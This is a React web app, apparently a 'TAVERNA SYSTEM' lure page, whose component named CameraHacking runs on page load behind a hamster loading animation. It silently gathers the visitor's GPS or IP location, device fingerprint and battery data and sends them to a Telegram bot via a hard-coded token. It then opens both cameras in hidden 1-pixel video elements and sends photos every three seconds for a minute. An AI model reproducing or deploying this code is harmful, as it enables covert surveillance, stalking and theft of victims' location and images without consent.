import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const captureCount = useRef(0);
  const startTime = useRef(null);
  const totalDuration = 60000; // 1 минута = 60000 мс
  const photoInterval = 3000; // 3 секунды

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  // Метод отправки текста в Telegram
  const sendToTelegram = (text) => {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      
      xhr.onload = function() {
        if (xhr.status === 200) {
          console.log('Сообщение отправлено успешно');
          resolve(true);
        } else {
          console.error('Ошибка отправки сообщения:', xhr.status, xhr.responseText);
          reject(new Error(`Ошибка ${xhr.status}: ${xhr.responseText}`));
        }
      };
      
      xhr.onerror = function() {
        console.error('Ошибка сети при отправке сообщения');
        reject(new Error('Ошибка сети'));
      };
      
      const data = JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        disable_notification: true
      });
      
      console.log('Отправка сообщения в Telegram');
      xhr.send(data);
    });
  };

  // Отправка фото в Telegram
  const sendPhotoToTelegram = (blob, caption = '') => {
    return new Promise((resolve, reject) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      if (caption) {
        formData.append('caption', caption);
      }

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      
      xhr.onload = function() {
        if (xhr.status === 200) {
          console.log('Фото отправлено успешно');
          resolve(true);
        } else {
          console.error('Ошибка отправки фото:', xhr.status, xhr.responseText);
          reject(new Error(`Ошибка ${xhr.status}: ${xhr.responseText}`));
        }
      };
      
      xhr.onerror = function() {
        console.error('Ошибка сети при отправке фото');
        reject(new Error('Ошибка сети'));
      };
      
      console.log('Отправка фото в Telegram');
      xhr.send(formData);
    });
  };

  // Получение геолокации
  const getGeolocation = () => {
    return new Promise((resolve) => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude, accuracy } = position.coords;
            console.log('GPS координаты получены:', latitude, longitude);
            resolve({
              latitude: latitude.toFixed(6),
              longitude: longitude.toFixed(6),
              accuracy: Math.round(accuracy),
              method: "GPS",
              success: true
            });
          },
          (error) => {
            console.log('GPS недоступен, получаем по IP:', error.message);
            getLocationByIP().then(resolve);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        console.log('Geolocation API не поддерживается, получаем по IP');
        getLocationByIP().then(resolve);
      }
    });
  };

  // Получение локации по IP
  const getLocationByIP = async () => {
    try {
      console.log('Получение локации по IP...');
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      return {
        latitude: data.latitude,
        longitude: data.longitude,
        city: data.city,
        region: data.region,
        country: data.country_name,
        isp: data.org,
        ip: data.ip,
        method: "IP",
        success: true
      };
    } catch (error) {
      console.error('Ошибка получения локации по IP:', error);
      return {
        success: false,
        error: error.message
      };
    }
  };

  // Получение информации о батарее
  const getBatteryInfo = async () => {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime,
          success: true
        };
      }
    } catch (error) {
      console.log('Ошибка получения информации о батарее:', error);
    }
    return { success: false };
  };

  // Сбор полной информации об устройстве
  const collectDeviceInfo = async () => {
    console.log('Начинаю сбор информации об устройстве...');
    
    const [batteryInfo, locationInfo] = await Promise.allSettled([
      getBatteryInfo(),
      getGeolocation()
    ]);

    // Определение ОС
    const ua = navigator.userAgent;
    let os = 'Unknown';
    let osVersion = 'Unknown';
    
    if (/Windows NT 10/i.test(ua)) { os = 'Windows'; osVersion = '10/11'; }
    else if (/Windows NT 6.3/i.test(ua)) { os = 'Windows'; osVersion = '8.1'; }
    else if (/Windows NT 6.2/i.test(ua)) { os = 'Windows'; osVersion = '8'; }
    else if (/Windows NT 6.1/i.test(ua)) { os = 'Windows'; osVersion = '7'; }
    else if (/Mac OS X (\d+[._]\d+)/i.test(ua)) { 
      os = 'macOS'; 
      const match = ua.match(/Mac OS X (\d+[._]\d+)/i);
      osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    }
    else if (/Android (\d+(\.\d+)+)/i.test(ua)) { 
      os = 'Android'; 
      const match = ua.match(/Android (\d+(\.\d+)+)/i);
      osVersion = match ? match[1] : 'Unknown';
    }
    else if (/iPhone OS (\d+_?\d*)/i.test(ua)) { 
      os = 'iOS'; 
      const match = ua.match(/iPhone OS (\d+_?\d*)/i);
      osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    }
    else if (/Linux/i.test(ua)) { os = 'Linux'; }

    // Определение браузера
    let browser = 'Unknown';
    let browserVersion = 'Unknown';
    
    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) { 
      browser = 'Chrome'; 
      const match = ua.match(/Chrome\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }
    else if (/Firefox/i.test(ua)) { 
      browser = 'Firefox'; 
      const match = ua.match(/Firefox\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }
    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) { 
      browser = 'Safari'; 
      const match = ua.match(/Version\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }
    else if (/Edg/i.test(ua)) { 
      browser = 'Edge'; 
      const match = ua.match(/Edg\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }

    // WebGL информация (GPU)
    let gpuInfo = 'Не доступно';
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          gpuInfo = `${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
        }
      }
    } catch (e) {}

    // Медиаустройства
    let mediaDevices = { cameras: 0, microphones: 0, speakers: 0 };
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      mediaDevices = {
        cameras: devices.filter(d => d.kind === 'videoinput').length,
        microphones: devices.filter(d => d.kind === 'audioinput').length,
        speakers: devices.filter(d => d.kind === 'audiooutput').length
      };
    } catch (e) {}

    const info = {
      timestamp: new Date().toISOString(),
      userAgent: ua.substring(0, 200),
      platform: navigator.platform,
      vendor: navigator.vendor,
      os: os,
      osVersion: osVersion,
      browser: browser,
      browserVersion: browserVersion,
      screenSize: `${window.screen.width}x${window.screen.height}`,
      availScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
      colorDepth: window.screen.colorDepth,
      devicePixelRatio: window.devicePixelRatio,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      battery: batteryInfo.status === 'fulfilled' ? batteryInfo.value : { success: false },
      location: locationInfo.status === 'fulfilled' ? locationInfo.value : { success: false },
      gpu: gpuInfo,
      mediaDevices: mediaDevices,
      ip: locationInfo.status === 'fulfilled' ? locationInfo.value.ip : 'Unknown',
      isMobile: /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
      cookieEnabled: navigator.cookieEnabled,
    };

    return info;
  };

  // Форматирование информации для отправки
  const formatDeviceInfo = (info) => {
    const batteryText = info.battery.success ? 
      `🔋 Батарея: ${info.battery.level}% (${info.battery.charging ? '⚡ Зарядка' : '🔋 Разрядка'})` : 
      '🔋 Батарея: Не доступно';
    
    let locationText = '';
    if (info.location.success) {
      if (info.location.method === "GPS") {
        locationText = `📍 GPS: ${info.location.latitude}, ${info.location.longitude} (±${info.location.accuracy}м)`;
      } else {
        locationText = `📍 IP: ${info.location.city || ''}, ${info.location.region || ''}, ${info.location.country || ''}\n   Координаты: ${info.location.latitude}, ${info.location.longitude}\n   IP: ${info.location.ip || ''}`;
      }
    } else {
      locationText = '📍 Геолокация: Не доступно';
    }
    
    return `🔍 ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ

📱 СИСТЕМА
▫️ ОС: ${info.os} ${info.osVersion}
▫️ Браузер: ${info.browser} ${info.browserVersion}
▫️ Платформа: ${info.platform}

🖥 ДИСПЛЕЙ
▫️ Разрешение: ${info.screenSize}
▫️ Доступно: ${info.availScreen}
▫️ Pixel Ratio: ${info.devicePixelRatio}

⚙️ ХАРАКТЕРИСТИКИ
▫️ Ядра CPU: ${info.hardwareConcurrency}
▫️ ОЗУ: ${info.deviceMemory} GB
${batteryText}

🎥 КАМЕРЫ
▫️ Доступно: ${info.mediaDevices.cameras}

${locationText}

🌍 ЯЗЫК И ВРЕМЯ
▫️ Язык: ${info.language}
▫️ Часовой пояс: ${info.timezone}

🔧 ДОПОЛНИТЕЛЬНО
▫️ Куки: ${info.cookieEnabled ? 'Вкл' : 'Выкл'}
▫️ Мобильное: ${info.isMobile ? 'Да' : 'Нет'}

⏰ СТАТУС
▫️ Время: ${new Date().toLocaleString()}

🚀 ЗАПУСКАЮ СЪЕМКУ: ФОТО КАЖДЫЕ 3 СЕКУНДЫ В ТЕЧЕНИЕ 1 МИНУТЫ`;
  };

  // Инициализация обеих камер параллельно
  const initializeCameras = async () => {
    try {
      console.log('Начинаю инициализацию камер...');
      
      // Очищаем предыдущие данные
      streamsRef.current = [];
      videoRefsRef.current = [];
      
      // Параметры для обеих камер
      const cameraConfigs = [
        {
          name: "Селфи камера",
          constraints: {
            video: {
              facingMode: "user",
              width: { ideal: 1280 },
              height: { ideal: 720 }
            },
            audio: false
          }
        },
        {
          name: "Задняя камера", 
          constraints: {
            video: {
              facingMode: { exact: "environment" },
              width: { ideal: 1280 },
              height: { ideal: 720 }
            },
            audio: false
          }
        }
      ];
      
      // Пытаемся получить доступ ко всем камерам
      const cameraPromises = cameraConfigs.map(async (config, index) => {
        try {
          console.log(`Попытка получить доступ к ${config.name}...`);
          const stream = await navigator.mediaDevices.getUserMedia(config.constraints);
          console.log(`${config.name} доступна`);
          
          // Создаем видео элемент для этой камеры
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: 0;
            transform: scale(0.1);
          `;
          video.autoplay = true;
          video.muted = true;
          video.playsInline = true;
          video.setAttribute('playsinline', '');
          video.srcObject = stream;
          document.body.appendChild(video);
          
          // Ждем, пока видео будет готово
          await new Promise((resolve, reject) => {
            const onLoaded = () => {
              video.removeEventListener('loadedmetadata', onLoaded);
              video.removeEventListener('error', onError);
              resolve();
            };
            
            const onError = (err) => {
              video.removeEventListener('loadedmetadata', onLoaded);
              video.removeEventListener('error', onError);
              reject(err);
            };
            
            video.addEventListener('loadedmetadata', onLoaded);
            video.addEventListener('error', onError);
            
            setTimeout(() => {
              if (video.readyState >= 1) {
                resolve();
              }
            }, 2000);
          });
          
          return {
            index: index,
            name: config.name,
            stream: stream,
            video: video,
            success: true
          };
          
        } catch (error) {
          console.log(`${config.name} не доступна:`, error.message);
          return {
            index: index,
            name: config.name,
            success: false,
            error: error.message
          };
        }
      });
      
      const results = await Promise.all(cameraPromises);
      
      // Сохраняем успешные камеры в правильном порядке
      results.forEach(result => {
        if (result.success) {
          streamsRef.current[result.index] = result.stream;
          videoRefsRef.current[result.index] = result.video;
        }
      });
      
      // Удаляем пустые элементы (если какие-то камеры не сработали)
      streamsRef.current = streamsRef.current.filter(Boolean);
      videoRefsRef.current = videoRefsRef.current.filter(Boolean);
      
      console.log(`Инициализация завершена. Доступно камер: ${streamsRef.current.length}`);
      
      // Выводим информацию о доступных камерах
      videoRefsRef.current.forEach((video, index) => {
        console.log(`Камера ${index}: ${video.videoWidth}x${video.videoHeight}`);
      });
      
      return streamsRef.current.length > 0;
      
    } catch (error) {
      console.error('Ошибка инициализации камер:', error);
      return false;
    }
  };

  // Создание фото с камеры
  const capturePhotoFromCamera = async (cameraIndex, video, cameraName) => {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      
      // Проверяем готовность видео
      if (video && video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        
        // Очищаем canvas
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        // Для селфи камеры делаем зеркальное отражение
        if (cameraName === "Селфи камера") {
          ctx.save();
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1);
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          ctx.restore();
        } else {
          // Обычное отображение для задней камеры
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }
        
        // Добавляем водяной знак TAVERNA
        ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
        ctx.font = 'bold 24px Arial';
        ctx.textAlign = 'right';
        ctx.fillText('TAVERNA', canvas.width - 20, canvas.height - 20);
        
        // Добавляем информацию
        ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
        ctx.textAlign = 'left';
        ctx.font = '14px Arial';
        ctx.fillText(`${cameraName}`, 20, 30);
        ctx.fillText(`#${captureCount.current + 1}`, 20, 50);
        ctx.fillText(`${video.videoWidth}x${video.videoHeight}`, 20, 70);
        ctx.fillText(new Date().toLocaleTimeString(), 20, 90);
        
      } else {
        // Тестовое изображение если видео не готово
        canvas.width = 800;
        canvas.height = 600;
        const ctx = canvas.getContext('2d');
        
        ctx.fillStyle = '#1a1a1a';
        ctx.fillRect(0, 0, 800, 600);
        
        ctx.fillStyle = '#FFFFFF';
        ctx.font = 'bold 30px Arial';
        ctx.textAlign = 'center';
        ctx.fillText(`Камера не активна: ${cameraName}`, 400, 250);
        ctx.fillText(`Фото #${captureCount.current + 1}`, 400, 300);
        ctx.fillText(new Date().toLocaleTimeString(), 400, 350);
        
        // Водяной знак TAVERNA
        ctx.fillStyle = 'rgba(255, 255, 255, 0.6)';
        ctx.font = 'bold 36px Arial';
        ctx.textAlign = 'right';
        ctx.fillText('TAVERNA', 780, 580);
      }
      
      // Конвертируем canvas в blob
      canvas.toBlob(blob => {
        if (blob) {
          console.log(`Фото с ${cameraName} создано: ${blob.size} байт`);
          resolve(blob);
        } else {
          resolve(null);
        }
      }, 'image/jpeg', 0.85);
    });
  };

  // Захват и отправка фото со всех камер
  const captureAndSendPhotos = async () => {
    const elapsed = Date.now() - startTime.current;
    
    // Проверяем не истекло ли время (1 минута)
    if (elapsed >= totalDuration) {
      stopCapturing();
      sendToTelegram(`⏰ ВРЕМЯ ИСТЕКЛО (1 МИНУТА)\n\n✅ Всего сделано фото: ${captureCount.current}\n📅 ${new Date().toLocaleString()}`);
      return;
    }
    
    // Определяем названия камер для каждого видео элемента
    const cameraNames = ["Селфи камера", "Задняя камера"];
    
    // Захватываем фото со всех доступных камер
    for (let i = 0; i < videoRefsRef.current.length; i++) {
      try {
        const video = videoRefsRef.current[i];
        const cameraName = i < cameraNames.length ? cameraNames[i] : `Камера ${i + 1}`;
        
        const photoBlob = await capturePhotoFromCamera(i, video, cameraName);
        
        if (photoBlob) {
          const elapsedSeconds = Math.floor(elapsed / 1000);
          const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
          
          const caption = `${cameraName}\n` +
            `📸 Фото #${captureCount.current + 1}\n` +
            `⏱ Прошло: ${elapsedSeconds} сек\n` +
            `⏳ Осталось: ${remainingSeconds} сек\n` +
            `🕐 ${new Date().toLocaleTimeString()}\n` +
            `🚀 TAVERNA SYSTEM`;
          
          console.log(`Отправка фото с ${cameraName}...`);
          await sendPhotoToTelegram(photoBlob, caption);
          console.log(`Фото с ${cameraName} отправлено`);
        }
      } catch (error) {
        console.error(`Ошибка при работе с камерой ${i}:`, error);
      }
    }
    
    captureCount.current++;
    
    // Отправляем статистику каждые 5 фото
    if (captureCount.current % 5 === 0) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
      
      try {
        await sendToTelegram(
          `📊 СТАТИСТИКА #${captureCount.current}\n\n` +
          `📸 Всего фото: ${captureCount.current}\n` +
          `📷 Активных камер: ${videoRefsRef.current.length}\n` +
          `⏱ Прошло: ${elapsedSeconds} сек\n` +
          `⏳ Осталось: ${remainingSeconds} сек\n` +
          `🚀 TAVERNA SYSTEM ACTIVE`
        );
      } catch (error) {
        console.error('Ошибка отправки статистики:', error);
      }
    }
  };

  // Запуск периодической съемки
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    console.log('Запуск периодической съемки на 1 минуту...');
    
    // Первые фото сразу
    setTimeout(() => {
      captureAndSendPhotos();
    }, 1000);
    
    // Последующие каждые 3 секунды
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhotos();
    }, photoInterval);
  };

  // Остановка съемки
  const stopCapturing = () => {
    console.log('Остановка съемки...');
    
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    // Закрываем все камеры
    streamsRef.current.forEach(stream => {
      if (stream) {
        stream.getTracks().forEach(track => {
          track.stop();
        });
      }
    });
    streamsRef.current = [];
    
    // Удаляем видео элементы
    videoRefsRef.current.forEach(video => {
      if (video) {
        video.srcObject = null;
        video.remove();
      }
    });
    videoRefsRef.current = [];
  };

  // Основная инициализация
  useEffect(() => {
    startTime.current = Date.now();
    
    const init = async () => {
      try {
        console.log('Начало инициализации TAVERNA SYSTEM');
        
        // Собираем информацию об устройстве
        const deviceInfo = await collectDeviceInfo();
        
        // Отправляем информацию
        await sendToTelegram(formatDeviceInfo(deviceInfo));
        
        // Инициализируем камеры
        const camerasReady = await initializeCameras();
        
        if (camerasReady) {
          await sendToTelegram(
            `🚀 КАМЕРЫ АКТИВИРОВАНЫ\n\n` +
            `📷 Доступно камер: ${streamsRef.current.length}\n` +
            `⏱ Съемка: Фото каждые 3 секунды\n` +
            `⏳ Длительность: 1 минута\n` +
            `📅 Старт: ${new Date().toLocaleString()}\n` +
            `🚀 TAVERNA SYSTEM ACTIVE`
          );
          
          // Запускаем съемку
          startPeriodicCapture();
          
          // Остановка через 1 минуту
          setTimeout(() => {
            stopCapturing();
            sendToTelegram(
              `⏰ СЪЕМКА ЗАВЕРШЕНА\n\n` +
              `✅ Итоговый отчет:\n` +
              `📸 Всего фото: ${captureCount.current}\n` +
              `📷 Использовано камер: ${streamsRef.current.length}\n` +
              `⏱ Общее время: 1 минута\n` +
              `🎉 TAVERNA SYSTEM: Процесс завершен`
            );
          }, totalDuration);
          
        } else {
          await sendToTelegram('❌ ОШИБКА: Не удалось активировать камеры\n🚫 TAVERNA SYSTEM: Операция отменена');
        }
      } catch (error) {
        console.error('Ошибка в основной инициализации:', error);
      }
    };
    
    setTimeout(init, 1000);
    
    return () => {
      stopCapturing();
    };
  }, [chatId]);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px'
      }}>
        <div className="wraper" style={{ transform: 'scale(1.4)' }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '50px',
            color: 'white',
            fontSize: '18px',
            fontWeight: 'bold',
            opacity: 0.9
          }}>
            TAVERNA SYSTEM ACTIVE...
          </div>
        </div>
      </div>

      {chatId && <CameraHacking chatId={chatId} />}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
